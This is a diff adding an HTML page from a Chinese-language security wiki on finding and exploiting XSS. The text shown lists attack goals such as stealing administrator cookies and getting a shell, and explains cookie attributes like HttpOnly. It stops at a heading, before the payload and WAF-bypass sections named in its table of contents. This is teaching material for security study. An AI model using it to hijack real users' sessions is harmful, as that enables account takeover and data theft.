@@ -1,0 +1,2611 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.0.6">
+    
+    
+      
+        <title>XSS - knowledge_wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/application.451f80e5.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.22915126.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#757575">
+      
+    
+    
+      <script src="../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="grey" data-md-color-accent="brown">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#xss" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../.." title="knowledge_wiki" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                knowledge_wiki
+              </span>
+              <span class="md-header-nav__topic">
+                XSS
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="../.." title="knowledge_wiki" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    knowledge_wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="Home" class="md-nav__link">
+      Home
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Web security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Web security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../01introduce/" title="Security Basic" class="md-nav__link">
+      Security Basic
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../02information_gathering/" title="information gathering" class="md-nav__link">
+      information gathering
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../03Web_Security_protocol/" title="Web Security protocol" class="md-nav__link">
+      Web Security protocol
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../04SQL_Injection/" title="SQL Injection" class="md-nav__link">
+      SQL Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../05xxe/" title="xxe" class="md-nav__link">
+      xxe
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../06Code_Injection/" title="Code Injection" class="md-nav__link">
+      Code Injection
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../07Command_execute/" title="Command execute" class="md-nav__link">
+      Command execute
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../08Variable_Coverage/" title="Variable Coverage" class="md-nav__link">
+      Variable Coverage
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        XSS
+      </label>
+    
+    <a href="./" title="XSS" class="md-nav__link md-nav__link--active">
+      XSS
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="漏洞危害" class="md-nav__link">
+    漏洞危害
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="基础知识" class="md-nav__link">
+    基础知识
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1cookie" title="1）Cookie的工作方式" class="md-nav__link">
+    1）Cookie的工作方式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="2）浏览器的解析方式" class="md-nav__link">
+    2）浏览器的解析方式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="3）编码知识" class="md-nav__link">
+    3）编码知识
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4xss" title="4）XSS分类介绍" class="md-nav__link">
+    4）XSS分类介绍
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" title="测试Payload" class="md-nav__link">
+    测试Payload
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" title="WAF绕过" class="md-nav__link">
+    WAF绕过
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" title="输出位置进行XSS" class="md-nav__link">
+    输出位置进行XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload_1" title="具体标签的Payload" class="md-nav__link">
+    具体标签的Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf_1" title="过WAF技巧" class="md-nav__link">
+    过WAF技巧
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#corsjsonp" title="域、同源策略、CORS、JSONP" class="md-nav__link">
+    域、同源策略、CORS、JSONP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="技巧搜集" class="md-nav__link">
+    技巧搜集
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../10CSRF/" title="CSRF" class="md-nav__link">
+      CSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../11file_processing/" title="File Processing" class="md-nav__link">
+      File Processing
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../12Session_Management/" title="Session Management" class="md-nav__link">
+      Session Management
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../13Unvalidated_Redirects_and_Forwards/" title="Unvalidated Redirects and Forwards" class="md-nav__link">
+      Unvalidated Redirects and Forwards
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../14SSRF/" title="SSRF" class="md-nav__link">
+      SSRF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../15unserialize/" title="unserialize" class="md-nav__link">
+      unserialize
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../16Databases_Security/" title="Databases Security" class="md-nav__link">
+      Databases Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../17Operating_system_Security/" title="Operating system Security" class="md-nav__link">
+      Operating system Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../18Middleware_Security/" title="Middleware Security" class="md-nav__link">
+      Middleware Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../19Pentest_Cheat_Sheets/" title="Pentest Cheat Sheets" class="md-nav__link">
+      Pentest Cheat Sheets
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-20" type="checkbox" id="nav-2-20">
+    
+    <label class="md-nav__link" for="nav-2-20">
+      tools
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-20">
+        tools
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_common/" title="common" class="md-nav__link">
+      common
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Nmap/" title="nmap" class="md-nav__link">
+      nmap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Burpsuite/" title="Burpsuite" class="md-nav__link">
+      Burpsuite
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_SQLMap/" title="SQLMap" class="md-nav__link">
+      SQLMap
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tools_Metasploit/" title="Metasploit" class="md-nav__link">
+      Metasploit
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      Bug-Bounty
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        Bug-Bounty
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/Bug-Bounty/" title="Bug-Bounty" class="md-nav__link">
+      Bug-Bounty
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Bug-Bounty/CTF/" title="CTF" class="md-nav__link">
+      CTF
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      Research on program vulnerabilities
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        Research on program vulnerabilities
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/攻击类漏洞利用/" title="漏洞利用" class="md-nav__link">
+      漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/01PHP Security/" title="PHP Security" class="md-nav__link">
+      PHP Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/02Binary_Security/" title="Binary Security" class="md-nav__link">
+      Binary Security
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/03Malware_tech/" title="Malware analysis" class="md-nav__link">
+      Malware analysis
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerabilities/04Malware_Analysis_tech/" title="Malware analysis tech" class="md-nav__link">
+      Malware analysis tech
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      Computer Forensics
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        Computer Forensics
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/00APT上机检查思路/" title="Introduce" class="md-nav__link">
+      Introduce
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/01Windows执行痕迹搜集/" title="Windows执行痕迹搜集" class="md-nav__link">
+      Windows执行痕迹搜集
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/02流量分析/" title="流量分析" class="md-nav__link">
+      流量分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/03内存分析/" title="内存分析" class="md-nav__link">
+      内存分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Linux/" title="入侵痕迹排查-Linux" class="md-nav__link">
+      入侵痕迹排查-Linux
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/04入侵痕迹排查-Windows/" title="入侵痕迹排查-Windows" class="md-nav__link">
+      入侵痕迹排查-Windows
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/06入侵手法/" title="入侵手法" class="md-nav__link">
+      入侵手法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../Computer_Forensics/05tools_common/" title="tools_commo" class="md-nav__link">
+      tools_commo
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../Information_Security_Engineer/" title="Information Security Engineer" class="md-nav__link">
+      Information Security Engineer
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7">
+    
+    <label class="md-nav__link" for="nav-7">
+      common
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        common
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/00_Programer_learn_Strategy/" title="程序员攻略" class="md-nav__link">
+      程序员攻略
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/01_Algrothm/" title="Algrothm" class="md-nav__link">
+      Algrothm
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3" type="checkbox" id="nav-7-3">
+    
+    <label class="md-nav__link" for="nav-7-3">
+      Python
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-7-3">
+        Python
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_1_python_基本语法/" title="基本语法" class="md-nav__link">
+      基本语法
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_2_python_变量和数据类型/" title="变量和数据类型" class="md-nav__link">
+      变量和数据类型
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_3_python_流程控制/" title="流程控制" class="md-nav__link">
+      流程控制
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_4_python_函数及作用域/" title="函数及作用域" class="md-nav__link">
+      函数及作用域
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_5_python_数学/" title="数学函数" class="md-nav__link">
+      数学函数
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_6_python_字符串/" title="字符串" class="md-nav__link">
+      字符串
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_7_python_列表/" title="列表" class="md-nav__link">
+      列表
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_8_python_tuple/" title="tuple" class="md-nav__link">
+      tuple
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_9_python_字典/" title="字典" class="md-nav__link">
+      字典
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_10_python_集合/" title="集合" class="md-nav__link">
+      集合
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_11_python_文件操作/" title="文件操作" class="md-nav__link">
+      文件操作
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_12_python_os/" title="OS" class="md-nav__link">
+      OS
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_13_python_shutil/" title="shutil" class="md-nav__link">
+      shutil
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_14_python_zip压缩/" title="zip压缩" class="md-nav__link">
+      zip压缩
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_15_python_calendar日历/" title="calendar日历" class="md-nav__link">
+      calendar日历
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_16_python_time时间/" title="time时间" class="md-nav__link">
+      time时间
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_17_python_类和对象/" title="类和对象" class="md-nav__link">
+      类和对象
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_18_python_模块和包/" title="模块和包" class="md-nav__link">
+      模块和包
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_19_python_错误和异常处理/" title="错误和异常处理" class="md-nav__link">
+      错误和异常处理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_20_python_tkinter/" title="tkinter" class="md-nav__link">
+      tkinter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_21_python_性能/" title="性能" class="md-nav__link">
+      性能
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/02_22_python_多线程/" title="多线程" class="md-nav__link">
+      多线程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7-3-23" type="checkbox" id="nav-7-3-23">
+    
+    <label class="md-nav__link" for="nav-7-3-23">
+      Flask
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-7-3-23">
+        Flask
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/1_URL和视图笔记/" title="URL和视图笔记" class="md-nav__link">
+      URL和视图笔记
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/2_模板笔记/" title="模板" class="md-nav__link">
+      模板
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/3_数据库/" title="数据库" class="md-nav__link">
+      数据库
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Python_flask/4_cookie和session笔记/" title="cookie和session笔记" class="md-nav__link">
+      cookie和session笔记
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/03_C_C++_Basic/" title="C_C++" class="md-nav__link">
+      C_C++
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/03_1_MFC/" title="C++_MFC" class="md-nav__link">
+      C++_MFC
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/04_Java_Book/" title="Java" class="md-nav__link">
+      Java
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Other-VBA语法/" title="VBA" class="md-nav__link">
+      VBA
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../common/Other-Powersehll/" title="Powersehll" class="md-nav__link">
+      Powersehll
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../安全岗位面试/" title="面试" class="md-nav__link">
+      面试
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="漏洞危害" class="md-nav__link">
+    漏洞危害
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="基础知识" class="md-nav__link">
+    基础知识
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1cookie" title="1）Cookie的工作方式" class="md-nav__link">
+    1）Cookie的工作方式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" title="2）浏览器的解析方式" class="md-nav__link">
+    2）浏览器的解析方式
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" title="3）编码知识" class="md-nav__link">
+    3）编码知识
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4xss" title="4）XSS分类介绍" class="md-nav__link">
+    4）XSS分类介绍
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#payload" title="测试Payload" class="md-nav__link">
+    测试Payload
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#waf" title="WAF绕过" class="md-nav__link">
+    WAF绕过
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss_1" title="输出位置进行XSS" class="md-nav__link">
+    输出位置进行XSS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload_1" title="具体标签的Payload" class="md-nav__link">
+    具体标签的Payload
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#waf_1" title="过WAF技巧" class="md-nav__link">
+    过WAF技巧
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#corsjsonp" title="域、同源策略、CORS、JSONP" class="md-nav__link">
+    域、同源策略、CORS、JSONP
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="技巧搜集" class="md-nav__link">
+    技巧搜集
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="xss">XSS漏洞挖掘与利用</h1>
+<h2 id="_1">漏洞危害</h2>
+<ul>
+<li>获取管理员Cookie，登录后台</li>
+<li>获取后台地址</li>
+<li>用户信息窃取</li>
+<li>Getshell</li>
+</ul>
+<h2 id="_2">基础知识</h2>
+<ul>
+<li>XSS漏洞挖掘与利用</li>
+</ul>
+<h3 id="1cookie"><strong>1）Cookie的工作方式</strong></h3>
+<p>XSS漏洞的主流利用方式是获取用户的Cookie执行一系列的操作。</p>
+<p>Cookie的基本通信流程：</p>
+<pre><code>1.设置cookie
+2.cookie被自动添加到request header中
+3.服务端接收到cookie
+</code></pre>
+
+<p>需要理解的问题：</p>
+<pre><code>1.什么样的数据适合放在cookie中
+
+对于设置“每次请求都要携带的信息（身份认证信息）”特别适合存放在cookie中。
+
+2.cookie是怎么设置的
+
+每个cookie都有一定的属性，如什么时候失效，要发送到哪个域名，哪个路径等等。这些属性是通过cookie选项来设置的，cookie选项包括：expires、domain、path、secure、HttpOnly。在设置任一个cookie时都可以设置相关的这些属性。代码示例如下：
+
+&quot;SESSIONID=e6f5cad435dc6a;expires=Thu,27Feb201705:21:00GMT;domain=www.xxx.com;path=/;secure;HttpOnly
+
+3.cookie为什么会自动加到request hearder中
+
+存储cookie是浏览器提供的功能，cookie是存储在浏览器中的纯文本。当网页要发HTTP请求时，浏览器会先检查是否有相应的cookie，有则自动添加到request hearder中的cookie字段中。这是浏览器自动做的。
+
+4.cookie怎么增删改查
+
+cookie既可以由服务端来设置，也可以由客户端来设置。
+
+cookie选项包括：expires、domain、path、secure、HttpOnly。
+
+expires选项用来设置“cookie什么时间内有效”。expires其实是cookie失效日期，对于失效的cookie浏览器会清空。如果没有设置该选项，则默认有效期为session，即会话cookie。这种cookie在浏览器关闭后就没有了。
+
+secure选项用来设置cookie只在确保安全的请求中才会发送。当请求是HTTPS或者其他安全协议时，包含secure选项的cookie才能被发送至服务器。
+
+HttpOnly用来设置cookie是否能通过js去访问。
+
+默认情况下，客户端是可以通过js代码去访问（包括读取、修改、删除等）这个cookie的。当cookie带httpOnly选项时，客户端则无法通过js代码去访问（包括读取、修改、删除等）
+
+</code></pre>
+
+<h3 id="2"><strong>2）浏览器的解析方式</strong></h3>
